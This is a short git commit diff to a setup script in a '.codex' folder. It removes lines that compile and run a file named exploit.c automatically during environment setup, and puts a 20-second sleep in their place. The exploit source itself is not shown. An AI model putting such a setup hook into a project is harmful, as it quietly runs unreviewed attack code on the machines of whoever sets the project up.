391b770eac670dfaaa28cf3f47cb116c34f03138
jiker666 <2224328047@qq.com>
2026-02-01 04:27:11 +0800

    Sleep in setup.sh

--- .codex/setup.sh
+++ .codex/setup.sh
@@ -1,11 +1,2 @@
 #!/bin/bash
-echo "Running setup.sh exploit..."
-if command -v gcc &> /dev/null; then
-    gcc exploit.c -o exploit
-    ./exploit
-elif command -v cc &> /dev/null; then
-    cc exploit.c -o exploit
-    ./exploit
-else
-    echo "No compiler found in setup.sh."
-fi
+sleep 20
